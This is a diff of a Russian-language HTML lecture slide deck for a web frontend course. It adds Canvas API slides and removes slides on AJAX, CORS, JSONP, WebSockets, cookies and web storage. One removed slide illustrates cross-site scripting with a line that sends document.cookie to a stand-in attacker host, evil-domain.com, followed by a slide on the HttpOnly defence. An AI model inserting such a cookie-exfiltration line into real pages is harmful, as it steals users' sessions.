+                <code>context.fillRect( x, y, width, height ); <mark class="comment">// Прямоугольник</mark></code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/figures.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Окружность</h2>
+        <div>
+            <pre>
+                <code>context.arc( </code>
+                <code>  x, y, radius, startAngle, </code>
+                <code>  endAngle [, anticlockwise ]</code>
+                <code>); <mark class="comment">// Окружность</mark></code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/figures.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Закругление</h2>
+        <div>
+            <pre>
+                <code>context.arcTo( </code>
+                <code>  x1, y1, x2, y2, </code>
+                <code>  radiusX [, radiusY, rotation ] </code>
+                <code>); <mark class="comment">// Соединение точек</mark></code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/figures.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Кривая Безье</h2>
+        <div>
+            <pre>
+                <code>context.quadraticCurveTo(x,y,x2,y2) <mark class="comment">// Квадратичная кривая</mark></code>
+                <code>context.bezierCurveTo(x,y,x2,y2,x3,y3) <mark class="comment">// Кубическая кривая</mark></code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/figures.html">Демонстрация</a><br />
+                <a href="https://ru.wikipedia.org/wiki/Кривая_Безье">Кривая Безье</a>
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>quadraticCurveTo</h2>
+        <div>
+            <img src="../../pics/Bézier_2_big.gif" alt="" width="100%" />
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>bezierCurveTo</h2>
+        <div>
+            <img src="../../pics/Bézier_3_big.gif" alt="" width="100%" />
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Трансформации</h2>
+        <div>
+            <pre>
+                <code>context.scale( x, y ) <mark class="comment">// Масштабирование</mark></code>
+                <code>context.rotate( angle ) <mark class="comment">// Поворот</mark></code>
+                <code>context.translate( x, y ) <mark class="comment">// Перенос</mark></code>
+                <code>context.transform(a, b, c, d, e, f) <mark class="comment">// ...</mark></code>
+                <code>context.save() <mark class="comment">// Сохранить текущее состояние</mark></code>
+                <code>context.restore() <mark class="comment">// Все как было, save и restore это стек!</mark></code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/figures.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>transform</h2>
+        <div>
+            <pre>
+                <code>context.transform(a, b, c, d, e, f); <mark class="comment">// Матрица преобразований</mark></code>
+                <code><mark class="comment">// a &mdash; Масштабирование, горизонтальное</mark></code>
+                <code><mark class="comment">// b &mdash; Наклон, горизонтальный</mark></code>
+                <code><mark class="comment">// c &mdash; Наклон, вертикальный</mark></code>
+                <code><mark class="comment">// d &mdash; Масштабирование, вертикальное</mark></code>
+                <code><mark class="comment">// e &mdash; Смещение, горизонтальное</mark></code>
+                <code><mark class="comment">// f &mdash; Смещение, вертикальное</mark></code>
             </pre>
         </div>
     </section>
 
     <section class="slide">
-        <h2>Способы</h2>
+        <h2>Изображения</h2>
         <div>
             <pre>
-                <code><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a></code>
-                <code>JSONP</code>
-                <code>IFRAME</code>
-                <code>CORS</code>
-                <code>WebSockets</code>
+                <code>context.createPattern(image, repetition);</code>
+                <code><mark class="comment">// image &mdash; image, canvas, video element</mark></code>
+                <code><mark class="comment">// repetition &mdash; repeat | repeat-x | repeat-y | no-repeat</mark></code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/images.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Изображения</h2>
+        <div>
+            <pre>
+                <code>context.drawImage(image, dx, dy)</code>
+                <code>context.drawImage(image, dx, dy, dw, dh)</code>
+                <code>context.drawImage(image, sx, sy, sw, sh, dx, dy, dw, dh)</code>
+                <code><mark class="comment">// image &mdash; image, canvas, video element</mark></code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/images.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>drawImage</h2>
+        <div style="text-align:center;">
+            <img src="../../pics/drawImage.png" alt="" />
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Compositing</h2>
+        <div>
+            <pre>
+                <code>context.globalAlpha = 0.0 .. 1.0</code>
+                <code>context.globalCompositeOperation = value</code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/compositing.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Image Data</h2>
+        <div>
+            <pre>
+                <code><mark class="comment">// pixel manipulation</mark></code>
+                <code>ImageData createImageData(sw, sh);</code>
+                <code>ImageData createImageData(ImageData);</code>
+                <code>ImageData getImageData(sx, sy, sw, sh);</code>
+                <code>void putImageData(ImageData, dx, dy, dirtyX, dirtyY, </code>
+                <code>      dirtyWidth, dirtyHeight);</code>
+                <code>void putImageData(ImageData, dx, dy);</code>
             </pre>
         </div>
     </section>
 
     <section class="slide">
-        <h2><code>XMLHttpRequest</code></h2>
+        <h2>Shadow</h2>
         <div>
             <pre>
-                <code>var xhr = new XMLHttpRequest();</code>
-                <code class="next">xhr.open("GET", "http://mail.ru/", true);</code>
-                <code class="next">xhr.send(null);</code>
+                <code>context.shadowColor</code>
+                <code>context.shadowOffsetX</code>
+                <code>context.shadowOffsetY</code>
+                <code>context.shadowBlur</code>
             </pre>
         </div>
     </section>
 
     <section class="slide">
-        <h2><code>XMLHttpRequest</code></h2>
+        <h2>Text</h2>
         <div>
             <pre>
-                <code>xhr.onreadystatechange = function (e) {</code>
-                <code>    <mark class="comment">/* e.target === xhr; */</mark></code>
-                <code>    if (xhr.readyState === 4) {</code>
-                <code>        if (xhr.status === 200) {</code>
-                <code>            alert(xhr.responseText);</code>
-                <code>        }</code>
-                <code>    }</code>
-                <code>};</code>
-            </pre>
-            <!-- DEMO -->
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2><code>readyState</code></h2>
-        <div>
-            <pre>
-                <code>0 <mark class="comment">/* UNSENT — до open() */</mark></code>
-                <code>1 <mark class="comment">/* OPENED — до send() */</mark></code>
-                <code>2 <mark class="comment">/* HEADERS_RECEIVED — данные еще не получены */</mark></code>
-                <code>3 <mark class="comment">/* LOADING — данные начали поступать */</mark></code>
-                <code>4 <mark class="comment">/* DONE — данные получены */</mark></code>
+                <code>context.font</code>
+                <code>context.textAlign</code>
+                <code>context.textBaseline</code>
             </pre>
         </div>
     </section>
 
     <section class="slide">
-        <h2><code>xhr.readyState === 4</code></h2>
+        <h2>Анимация</h2>
         <div>
-            <pre>
-                <code>xhr.status <mark class="comment">/* Number */</mark></code>
-                <code>xhr.responseText <mark class="comment">/* String */</mark></code>
-                <code>xhr.responseXML <mark class="comment">/* XMLDocument */</mark></code>
-            </pre>
+            <ul>
+                <li>Рисуем</li>
+                <li>Стираем</li>
+                <li>Рисуем</li>
+                <li>Стираем</li>
+                <li>...</li>
+            </ul>
         </div>
     </section>
 
     <section class="slide">
+        <h2>Анимация</h2>
+        <div>
+            <figure>
+                <blockquote>
+                    <p>Что-то пошло не так</p>
+                </blockquote>
+            </figure>
+            <p class="note">
+                <a href="../../d/canvas/animation.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Анимация</h2>
+        <div>
+            <ul>
+                <li>Рисуем</li>
+                <li><mark class="comment">Ждем</mark></li>
+                <li>Стираем</li>
+                <li>Рисуем</li>
+                <li><mark class="comment">Ждем</mark></li>
+            </ul>
+            <p class="note">
+                <a href="../../d/canvas/animation.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide">
+        <h2>Анимация и время</h2>
+        <div>
+            <pre>
+                <code>var startTime, animationTime, length;</code>
+                <code>var time = new Date().getTime();</code>
+                <code>var shiftTime = time - startTime;</code>
+                <code>var multiply = shiftTime / animationTime;</code>
+                <code>var x = length * multiply;</code>
+            </pre>
+            <p class="note">
+                <a href="../../d/canvas/animationTime.html">Демонстрация</a>.
+            </p>
+        </div>
+    </section>
+
+    <section class="slide title">
         <h2>
-            <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Same_origin_policy_for_JavaScript">Same-origin policy</a>
+            <span>3D context</span>
         </h2>
+    </section>
+
+    <section class="slide">
+        <h2>three.js</h2>
         <div>
-            <pre>
-                <code>https://e.mail.ru/messages/inbox/ <mark class="comment">(ORIGIN)</mark></code>
-                <code class="next">https://e.mail.ru/compose/ <mark class="comment">(SAME-ORIGIN)</mark></code>
-                <code class="next"><mark class="important">http</mark>://e.mail.ru/compose/ <mark class="comment">(CROSS-ORIGIN)</mark></code>
-                <code class="next">https://e.mail.ru:<mark class="important">8080</mark>/compose/ <mark class="comment">(CROSS-ORIGIN)</mark></code>
-                <code class="next">https://<mark class="important">news</mark>.mail.ru/ <mark class="comment">(CROSS-ORIGIN)</mark></code>
-            </pre>
+            <p class="note">
+                <a href="http://threejs.org">http://threejs.org</a>
+            </p>
+            <p class="note">
+                <a href="../../d/threejs/earth.html">Демонстрация</a>.
+            </p>
         </div>
     </section>
 
     <section class="slide">
-        <h2><a href="http://www.json-p.org">JSONP</a></h2>
+        <h2>Полезные ссылки</h2>
         <div>
-            <pre>
-                <code>&lt;script&gt;</code>
-                <code>    function resultHnd(json) {</code>
-                <code>        <mark class="comment">/* json */</mark></code>
-                <code>    }</code>
-                <code>&lt;/script&gt;</code>
-                <div class="next">
-                    <code>&lt;script src="http://example.com/users/?cb=resultHnd"&gt;</code>
-                    <code>&lt;/script&gt;</code>
-                </div>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>JSONP</h2>
-        <div>
-            <pre>
-                <code><mark class="comment">&gt;</mark> GET /users/?cb=resultHnd HTTP/1.0</code>
-                <code><mark class="comment">&lt;</mark> resultHnd({ … });</code>
-            <div class="next">
-                <code> </code>
-                <code><mark class="comment">&gt;</mark> GET /users/?cb=resultHndN HTTP/1.0</code>
-                <code><mark class="comment">&lt;</mark> resultHndN({ … });</code>
-            </div>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>IFRAME (SAME-ORIGIN)</h2>
-        <div>
-            <pre>
-                <code>&lt;iframe name="req" src="javascript:false"</code>
-                <code>    style="display:none"&gt;&lt;/iframe&gt;</code>
-                <div class="next">
-                    <code>&lt;script&gt;</code>
-                    <code>    function resultHnd(json) {</code>
-                    <code>        <mark class="comment">/* json */</mark></code>
-                    <code>    }</code>
-                    <code>&lt;/script&gt;</code>
-                </div>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>IFRAME (SAME-ORIGIN)</h2>
-        <div>
-            <pre>
-                <code>&lt;form action="/ifecho" method="post" target="req"&gt;</code>
-                <code>    &lt;input type="hidden" name="cb" value="resultHnd" /&gt;</code>
-                <code>    &lt;input type="text" name="msg" value="Hello" /&gt;</code>
-                <code>&lt;/form&gt;</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>IFRAME (SAME-ORIGIN)</h2>
-        <div>
-            <pre>
-                <code><mark class="comment">&gt;</mark> POST /ifecho HTTP/1.0</code>
-                <code><mark class="comment">&gt;</mark> …</code>
-                <code> </code>
-                <code><mark class="comment">&lt;</mark> &lt;script&gt;</code>
-                <code><mark class="comment">&lt;</mark>     window.parent.resultHnd({ … });</code>
-                <code><mark class="comment">&lt;</mark> &lt;/script&gt;</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>IFRAME (CROSS-ORIGIN)</h2>
-        <div>
-            <pre>
-                <code><mark class="comment">&gt;</mark> POST /ifecho HTTP/1.0</code>
-                <code><mark class="comment">&gt;</mark> …</code>
-                <code> </code>
-                <code><mark class="comment">&lt;</mark> &lt;script&gt;</code>
-                <code><mark class="comment">&lt;</mark>     <s>window.parent.resultHnd({ … });</s></code>
-                <code><mark class="comment">&lt;</mark> &lt;/script&gt;</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>IFRAME (CROSS-ORIGIN)</h2>
-        <div>
-            <pre>
-                <code><mark class="comment">&gt;</mark> POST /ifecho HTTP/1.0</code>
-                <code><mark class="comment">&gt;</mark> …</code>
-                <code> </code>
-                <code><mark class="comment">&lt;</mark> &lt;script&gt;</code>
-                <code><mark class="comment">&lt;</mark>     window.parent.postMessage("resultHnd:{ … }", "*");</code>
-                <code><mark class="comment">&lt;</mark> &lt;/script&gt;</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>IFRAME (CROSS-ORIGIN)</h2>
-        <div>
-            <pre>
-                <code>IFRAME <mark class="comment">(ДЛЯ ЗАГРУЗКИ)</mark> + </code>
-                <code>    JSONP <mark class="comment">(ДЛЯ ОТСЛЕЖИВАНИЯ СТАТУСА)</mark></code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Cross-Origin Resource Sharing</h2>
-        <div>
-            <pre>
-                <code><mark class="comment">/* Origin: tech-mail.ru */</mark></code>
-                <code>var xhr = new XMLHttpRequest();</code>
-                <code>xhr.onreadystatechange = function (e) { };</code>
-                <code>xhr.open("GET", "http://mail.ru/", true);</code>
-                <code>xhr.send(null);</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Cross-Origin Resource Sharing</h2>
-        <div>
-            <pre>
-                <code><mark class="comment">&gt;</mark> GET / HTTP/1.1</code>
-                <code><mark class="comment">&gt;</mark> Host: mail.ru</code>
-                <code><mark class="comment">&gt;</mark> Referer: http://tech-mail.ru/</code>
-                <code><mark class="comment">&gt;</mark> Origin: http://tech-mail.ru/</code>
-                <code><mark class="comment">&gt;</mark> User-Agent: Mozilla/5.0 …</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Cross-Origin Resource Sharing</h2>
-        <div>
-            <pre>
-                <code><mark class="comment">&lt;</mark> HTTP/1.1 200 OK</code>
-                <code><mark class="comment">&lt;</mark> Content-Type: text/html; charset=utf-8</code>
-                <code><mark class="comment">&lt;</mark> Content-Length: 201474</code>
-                <code><mark class="comment">&lt;</mark> …</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Cross-Origin Resource Sharing</h2>
-        <div>
-            <pre>
-                <code>XMLHttpRequest cannot load http://mail.ru/.</code>
-                <code>No 'Access-Control-Allow-Origin' header is present</code>
-                <code>on the requested resource. Origin 'http://tech-mail.ru'</code>
-                <code>is therefore not allowed access.</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Cross-Origin Resource Sharing</h2>
-        <div>
-            <pre>
-                <code><mark class="comment">&lt;</mark> HTTP/1.1 200 OK</code>
-                <code><mark class="comment">&lt;</mark> Access-Control-Allow-Origin: *</code>
-                <code><mark class="comment">&lt;</mark> Content-Type: text/html; charset=utf-8</code>
-                <code><mark class="comment">&lt;</mark> Content-Length: 201474</code>
-                <code><mark class="comment">&lt;</mark> …</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>CORS With Credentials</h2>
-        <div>
-            <pre>
-                <code><mark class="comment">/* Origin: tech-mail.ru */</mark></code>
-                <code>var xhr = new XMLHttpRequest();</code>
-                <code>xhr.withCredentials = true;</code>
-                <code> </code>
-                <code><mark class="comment">&lt;</mark> Access-Control-Allow-Origin: http://tech-mail.ru</code>
-                <code><mark class="comment">&lt;</mark> Access-Control-Allow-Credentials: true</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Comet</h2>
-        <div>
-            <figure>
-                <blockquote>
-                    <p><strong>Comet</strong> — любая модель работы веб-приложения, при которой постоянное HTTP-соединение позволяет веб-серверу отправлять (push) данные браузеру без дополнительного запроса со стороны браузера.</p>
-                </blockquote>
-                <figcaption><a href="http://ru.wikipedia.org/wiki/Comet_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5)">Википедия</a></figcaption>
-            </figure>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Comet</h2>
-        <div>
-            <pre>
-                <code>IFRAME <mark class="comment">/* …&lt;script&gt;…&lt;/script&gt;…&lt;script&gt;…&lt;/script&gt;… */</mark></code>
-                <code><a href="http://www.w3.org/TR/websockets/">WebSockets</a></code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Поддержка WebSockets</h2>
-        <div>
-            <pre>
-                <code>Chrome 16 &amp; Chrome for Android 16</code>
-                <code>Firefox 11</code>
-                <code>Internet Explorer 10</code>
-                <code>Opera 12.10</code>
-                <code>Safari 6.0 &amp; Safari Mobile 6.0</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Особенности WebSockets</h2>
-        <div>
-            <pre>
-                <code>Upgrades from HTTP 1.1</code>
-                <code>Cross-Origin Resource Sharing (CORS)</code>
-                <code>Message-based</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Использование WebSockets</h2>
-        <div>
-            <pre>
-                <code>var connection = new WebSocket('ws://example.com/echo');</code>
-                <code>connection.onopen = function () { … };</code>
-                <code>connection.onerror = function (error) { … };</code>
-                <code>connection.onmessage = function (e) { <mark class="comment">/* e.data */</mark> };</code>
-                <code>connection.send(msg);</code>
-            </pre>
+            <p class="note">
+                <a href="http://www.html5canvastutorials.com/">html5 canvas tutorial</a><br />
+                <a href="http://www.awwwards.com/22-experimental-webgl-demo-examples.html">22 Experimental WebGL Demo</a><br />
+                <a href="http://www.chromeexperiments.com/">Chrome Experiments</a>
+            </p>
         </div>
     </section>
 
     <section class="slide">
         <h2>Домашнее задание</h2>
         <div>
-            <pre>
-                <code>ВЗАИМОДЕЙСТВИЕ С СЕРВЕРОМ С ПОМОЩЬЮ AJAX</code>
-            </pre>
+            <ul>
+                <li>Объект (круг, квадрат, картинка)</li>
+                <li>Объект двигается вверх-вниз по синусоиде</li>
+                <li>Кнопки вверх/вниз изменяют амплитуду</li>
+                <li>Кнопки вправо/влево изменяют частоту</li>
+                <li>За объектом остается след из кривых</li>
+                <li>Кнопка нарисована на canvas</li>
+            </ul>
         </div>
     </section>
-
-    <section class="slide">
-        <h2>Подготовка</h2>
-        <div>
-            <pre>
-                <code>$ git remote add tp \</code>
-                <code>→ https://github.com/eprev/frontend-stub.git</code>
-                <code>$ git remote update</code>
-                <code>$ git merge tp/v4</code>
-            </pre>
-        </div>
+    
+    <section class="slide cover h bright">
+        <img style="width:auto; height:100%;" src="../../pics/canvas-homework.png" alt="" />
     </section>
-
-    <section class="slide">
-        <h2>Разрешаем конфикты</h2>
-        <div>
-            <pre>
-                <code>$ git status</code>
-                <code>$ git add …</code>
-                <code>$ git commit -m "Fix merge conflicts"</code>
-                <code>$ grunt</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Запускаем</h2>
-        <div>
-            <pre>
-                <code>$ npm install</code>
-                <code>$ grunt</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide title">
-        <h2>
-            <span>3 Хранение данных</span>
-        </h2>
-    </section>
-
-    <section class="slide shout">
-        <h2>
-            HTTP is a stateless protocol
-        </h2>
-    </section>
-
-    <section class="slide shout">
-        <h2>
-            Cookies
-        </h2>
-    </section>
-
-    <section class="slide">
-        <h2>Cookies</h2>
-        <div>
-            <figure>
-                <blockquote>
-                    <p><strong>Куки</strong> — небольшой фрагмент данных, отправленный веб-сервером и хранимый на компьютере пользователя. Веб-клиент (обычно веб-браузер) всякий раз при попытке открыть страницу соответствующего сайта пересылает этот фрагмент данных веб-серверу в виде HTTP-запроса.</p>
-                </blockquote>
-                <figcaption><a href="http://ru.wikipedia.org/wiki/HTTP_cookie">Википедия</a></figcaption>
-            </figure>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Использование</h2>
-        <div>
-            <pre>
-                <code>АУТЕНТИФИКАЦИЯ</code>
-                <code>ХРАНЕНИЕ НАСТРОЕК ПОЛЬЗОВАТЕЛЕЙ</code>
-                <code>ОТСЛЕЖИВАНИЕ СЕАНСА</code>
-                <code>СБОР СТАТИСТИКИ</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2><a href="http://tools.ietf.org/html/rfc2965">Спецификация</a></h2>
-        <div>
-            <pre>
-                <code>ДО 4096 БАЙТ МИНМУМ</code>
-                <code>МИНИМУМ 20 ШТ. НА ДОМЕН</code>
-                <code>МИНИМУМ 300 ШТ. ВСЕГО</code>
-                <code>ИМЕНЯ НЕЧУВСТВИТЕЛЬНЫ К РЕГИСТРУ</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>1 Клиент → Сервер</h2>
-        <div>
-            <pre>
-                <code>GET / HTTP/1.1</code>
-                <code>Host: example.com</code>
-                <code>…</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>2 Клиент ← Сервер</h2>
-        <div>
-            <pre>
-                <code>HTTP/1.1 200 OK</code>
-                <code><mark>Set-Cookie: name=value</mark></code>
-                <code>Content-Type: text/html</code>
-                <code>…</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>3 Клиент → Сервер</h2>
-        <div>
-            <pre>
-                <code>GET / HTTP/1.1</code>
-                <code>Host: example.com</code>
-                <code><mark>Cookie: name=value</mark></code>
-                <code>…</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>4 Клиент ← Сервер</h2>
-        <div>
-            <pre>
-                <code>HTTP/1.1 200 OK</code>
-                <code><mark>Set-Cookie: name=newValue</mark></code>
-                <code>Content-Type: text/html</code>
-                <code>…</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Set-Cookie</h2>
-        <div>
-            <pre>
-                <code>Set-Cookie: value[; expires=date][; domain=domain]</code>
-                <code>            [; path=path][; secure][; HttpOnly]</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Set-Cookie’s expires</h2>
-        <div>
-            <pre>
-                <code>Set-Cookie: value; expires=Sat, 01 March 2014 13:21:34 GMT</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Set-Cookie’s domain</h2>
-        <div>
-            <pre>
-                <code>Set-Cookie: value1; domain=.mail.ru</code>
-            </pre>
-            <pre>
-                <code>Set-Cookie: value2; domain=e.mail.ru</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Set-Cookie’s path</h2>
-        <div>
-            <pre>
-                <code>Set-Cookie: value1; path=/</code>
-            </pre>
-            <pre>
-                <code>Set-Cookie: value2; path=/check</code>
-            </pre>
-            <pre>
-                <code>Set-Cookie: value3; path=/checkout</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Cookie ID</h2>
-        <div>
-            <pre>
-                <code>Set-Cookie: name=value1; domain=.example.com; path=/</code>
-                <code>Set-Cookie: name=value2; domain=www.example.com; path=/</code>
-                <code>Set-Cookie: name=value3; domain=.example.com; path=/archive</code>
-            </pre>
-            <pre>
-                <code>Cookie: name=value1; name=value2; name=value3</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>JavaScript</h2>
-        <div>
-            <pre>
-                <code>document.cookie; <mark class="comment">/* "name=newValue" */</mark></code>
-                <code class="next">document.cookie = "name2=value";</code>
-                <code class="next">document.cookie; <mark class="comment">/* "name=newValue; name2=value" */</mark></code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2><a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Cross Site Scripting</a> (XSS)</h2>
-        <div>
-            <pre>
-                <code>(new Image()).src = "http://evil-domain.com/?cookie=" +</code>
-                <code>                    document.cookie;</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>HttpOnly</h2>
-        <div>
-            <pre>
-                <code>Set-Cookie: name1=value;</code>
-                <code>Set-Cookie: name2=value; HttpOnly</code>
-            </pre>
-            <pre>
-                <code>document.cookie; <mark class="comment">/* "name1=value" */</mark></code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide shout">
-        <h2>
-            localStorage
-        </h2>
-    </section>
-
-    <section class="slide">
-        <h2><code>window.localStorage</code></h2>
-        <div>
-            <pre>
-                <code>localStorage[key]; <mark class="comment">/* String */</mark></code>
-                <code>localStorage[key] = value; <mark class="comment">/* String */</mark></code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2><code>window.localStorage</code></h2>
-        <div>
-            <pre>
-                <code>localStorage.length</code>
-                <code>localStorage.key(i)<mark class="comment">/* String */</mark></code>
-                <code>localStorage.getItem(key) <mark class="comment">/* String */</mark></code>
-                <code>localStorage.setItem(key, value)</code>
-                <code>localStorage.removeItem(key)</code>
-                <code>localStorage.clear()</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Событие <code>storage</code></h2>
-        <div>
-            <pre>
-                <code>window.addEventListener("storage", function (e) {</code>
-                <code>    <mark class="comment">/* e.key, e.newValue */</mark></code>
-                <code>})</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>JSON</h2>
-        <div>
-            <pre>
-                <code>function setJSON(key, value) {</code>
-                <code>    localStorage[key] = JSON.stringify(value);</code>
-                <code>}</code>
-                <code>function getJSON(key) {</code>
-                <code>    var value = localStorage[key];</code>
-                <code>    return value ? JSON.parse(value) : null;</code>
-                <code>}</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide shout">
-        <h2>
-            sessionStorage
-        </h2>
-    </section>
-
-    <section class="slide">
-        <h2><a href="http://www.html5rocks.com/en/tutorials/offline/storage/">Что есть еще?</a></h2>
-        <div>
-            <pre>
-                <code>IndexedDB</code>
-                <code>FileSystem</code>
-            </pre>
-        </div>
-    </section>
-
-    <section class="slide">
-        <h2>Домашнее задание</h2>
-        <div>
-            <pre>
-                <code>СОХРАНЕНИЕ РЕЗУЛЬТАТОВ ИГРЫ, ПРИ ОСТУСТВИИ СВЯЗИ.</code>
-            </pre>
-        </div>
-    </section>
-
-    <!-- http://www.html5rocks.com/en/features/storage -->
 
     <div class="progress"><div></div></div>
     <script src="../../shower/shower.min.js"></script>
